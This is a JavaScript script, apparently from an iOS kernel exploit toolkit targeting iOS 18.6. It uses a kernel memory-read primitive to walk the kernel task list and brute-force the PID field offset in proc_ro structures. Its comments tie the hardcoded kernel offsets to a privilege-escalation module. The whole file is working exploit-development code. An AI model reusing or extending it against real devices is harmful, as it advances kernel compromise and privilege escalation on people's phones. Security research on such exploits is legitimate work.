// ============================================================================
// probe_offsets.js — Brute-force scan to find the PID field offset
// ============================================================================
//
// REPL API assumed:
//   kread64(addr)        -> BigInt   — read 8 bytes from kernel address
//   kread32(addr)        -> Number   — read 4 bytes from kernel address
//   kernelBase()         -> BigInt   — current kernel base
//   kernelSlide()        -> BigInt   — current KASLR slide
//   log(msg)             -> void     — print to REPL console
//
// Offsets from PEOffsets (PrivilegeEscalation.swift) / Constants.swift
// Targeting: iPhone17 / iOS 18.6 / XNU 24.6
// ============================================================================

(function probeOffsets() {
    "use strict";

    // --- Known offsets (from PrivilegeEscalation.swift) ----------------------
    const OFFSET_KERNEL_TASK  = 0xc1bf78n;   // kernelBase + this = &kernel_task ptr
    const OFFSET_TASK_NEXT    = 0x30n;        // task->tasks.next
    const OFFSET_PROC_RO      = 0x3e0n;       // task->proc_ro

    // Candidate PID offsets to try within proc_ro (and dereferenced proc)
    const SCAN_RANGE_START    = 0x0n;
    const SCAN_RANGE_END      = 0x600n;
    const STEP                = 0x8n;

    // --- Helpers -------------------------------------------------------------
    function hex(val) {
        if (typeof val === "bigint") return "0x" + val.toString(16);
        return "0x" + val.toString(16);
    }

    function isPidLike(val) {
        // PID is a 32-bit value; mask to lower 32 bits and check range
        var lo = Number(val & 0xFFFFFFFFn);
        return lo >= 0 && lo < 1000;
    }

    function safeKread64(addr) {
        try {
            return kread64(addr);
        } catch (e) {
            return null;
        }
    }

    // --- Step 1: Read kernel_task --------------------------------------------
    var kbase = kernelBase();
    log("[probe] kernel_base = " + hex(kbase));

    var kernelTaskAddr = kbase + OFFSET_KERNEL_TASK;
    var kernelTaskVal = kread64(kernelTaskAddr);
    log("[probe] kernel_task ptr @ " + hex(kernelTaskAddr) + " = " + hex(kernelTaskVal));

    if (kernelTaskVal === 0n) {
        log("[probe] ERROR: kernel_task is NULL. Wrong offset?");
        return;
    }

    // --- Step 2: Walk first N tasks ------------------------------------------
    var MAX_TASKS = 10;
    var tasks = [];

    var current = safeKread64(kernelTaskVal + OFFSET_TASK_NEXT);
    log("[probe] First task (kernel_task->next) = " + hex(current));

    for (var i = 0; i < MAX_TASKS && current !== null && current !== 0n && current !== kernelTaskVal; i++) {
        tasks.push(current);
        current = safeKread64(current + OFFSET_TASK_NEXT);
    }

    log("[probe] Collected " + tasks.length + " tasks for scanning\n");

    // --- Step 3: For each task, scan proc_ro at every 8-byte offset ----------
    // Strategy A: read proc_ro pointer, then scan offsets directly within proc_ro
    // Strategy B: read proc_ro pointer, dereference it (proc_ro->proc), then scan

    for (var ti = 0; ti < tasks.length; ti++) {
        var taskAddr = tasks[ti];
        var procROAddr = safeKread64(taskAddr + OFFSET_PROC_RO);
        if (procROAddr === null || procROAddr === 0n) {
            log("[probe] task[" + ti + "] @ " + hex(taskAddr) + " — proc_ro is NULL, skipping");
            continue;
        }

        log("[probe] === task[" + ti + "] @ " + hex(taskAddr) + " ===");
        log("[probe]     proc_ro = " + hex(procROAddr));

        // Strategy A: scan proc_ro directly for PID-like values
        var hitsA = [];
        for (var off = SCAN_RANGE_START; off < SCAN_RANGE_END; off += STEP) {
            var val = safeKread64(procROAddr + off);
            if (val !== null && isPidLike(val)) {
                var pid32 = Number(val & 0xFFFFFFFFn);
                hitsA.push({ offset: off, pid: pid32, raw: val });
            }
        }

        if (hitsA.length > 0) {
            log("[probe]   Strategy A (proc_ro + offset -> PID-like):");
            for (var h = 0; h < hitsA.length; h++) {
                log("[probe]     offset " + hex(hitsA[h].offset) +
                    " => PID=" + hitsA[h].pid +
                    " (raw=" + hex(hitsA[h].raw) + ")");
            }
        } else {
            log("[probe]   Strategy A: no PID-like values found in proc_ro 0x0-0x600");
        }

        // Strategy B: dereference proc_ro[0] as a pointer, then scan that struct
        var procVal = safeKread64(procROAddr);
        if (procVal !== null && procVal !== 0n && (procVal & 0xffffff0000000000n) !== 0n) {
            // Looks like a kernel pointer; dereference and scan
            var hitsB = [];
            for (var off = SCAN_RANGE_START; off < SCAN_RANGE_END; off += STEP) {
                var val = safeKread64(procVal + off);
                if (val !== null && isPidLike(val)) {
                    var pid32 = Number(val & 0xFFFFFFFFn);
                    hitsB.push({ offset: off, pid: pid32, raw: val });
                }
            }

            if (hitsB.length > 0) {
                log("[probe]   Strategy B (deref proc_ro -> proc @ " + hex(procVal) + "):");
                for (var h = 0; h < hitsB.length; h++) {
                    log("[probe]     offset " + hex(hitsB[h].offset) +
                        " => PID=" + hitsB[h].pid +
                        " (raw=" + hex(hitsB[h].raw) + ")");
                }
            } else {
                log("[probe]   Strategy B: no PID-like values in dereferenced proc struct");
            }
        } else {
            log("[probe]   Strategy B: proc_ro[0] = " + hex(procVal) + " — not a valid kernel pointer, skipping");
        }

        log("");
    }

    // --- Step 4: Cross-reference — which offsets appear consistently? ---------
    log("[probe] === CROSS-REFERENCE SUMMARY ===");
    log("[probe] Looking for offsets that yield PID-like values across multiple tasks...\n");

    // Gather Strategy A hits per offset
    var offsetCounts = {};
    for (var ti = 0; ti < tasks.length; ti++) {
        var taskAddr = tasks[ti];
        var procROAddr = safeKread64(taskAddr + OFFSET_PROC_RO);
        if (procROAddr === null || procROAddr === 0n) continue;

        for (var off = SCAN_RANGE_START; off < SCAN_RANGE_END; off += STEP) {
            var val = safeKread64(procROAddr + off);
            if (val !== null && isPidLike(val)) {
                var key = hex(off);
                if (!offsetCounts[key]) offsetCounts[key] = 0;
                offsetCounts[key]++;
            }
        }
    }

    var sorted = Object.keys(offsetCounts).sort(function(a, b) {
        return offsetCounts[b] - offsetCounts[a];
    });

    log("[probe] Strategy A — offsets with PID-like values (most consistent first):");
    for (var si = 0; si < Math.min(sorted.length, 20); si++) {
        var key = sorted[si];
        log("[probe]   " + key + " => hit in " + offsetCounts[key] + "/" + tasks.length + " tasks");
    }

    if (sorted.length === 0) {
        log("[probe]   (none found — proc_ro layout may differ)");
    }

    // Also cross-reference Strategy B
    var offsetCountsB = {};
    for (var ti = 0; ti < tasks.length; ti++) {
        var taskAddr = tasks[ti];
        var procROAddr = safeKread64(taskAddr + OFFSET_PROC_RO);
        if (procROAddr === null || procROAddr === 0n) continue;
        var procVal = safeKread64(procROAddr);
        if (procVal === null || procVal === 0n || (procVal & 0xffffff0000000000n) === 0n) continue;

        for (var off = SCAN_RANGE_START; off < SCAN_RANGE_END; off += STEP) {
            var val = safeKread64(procVal + off);
            if (val !== null && isPidLike(val)) {
                var key = hex(off);
                if (!offsetCountsB[key]) offsetCountsB[key] = 0;
                offsetCountsB[key]++;
            }
        }
    }

    var sortedB = Object.keys(offsetCountsB).sort(function(a, b) {
        return offsetCountsB[b] - offsetCountsB[a];
    });

    log("\n[probe] Strategy B — offsets with PID-like values (deref proc_ro first):");
    for (var si = 0; si < Math.min(sortedB.length, 20); si++) {
        var key = sortedB[si];
        log("[probe]   " + key + " => hit in " + offsetCountsB[key] + "/" + tasks.length + " tasks");
    }

    if (sortedB.length === 0) {
        log("[probe]   (none found)");
    }

    log("\n[probe] Known PEOffsets.proPid = 0x1b8 — check if it appears above.");
    log("[probe] Done.");
})();
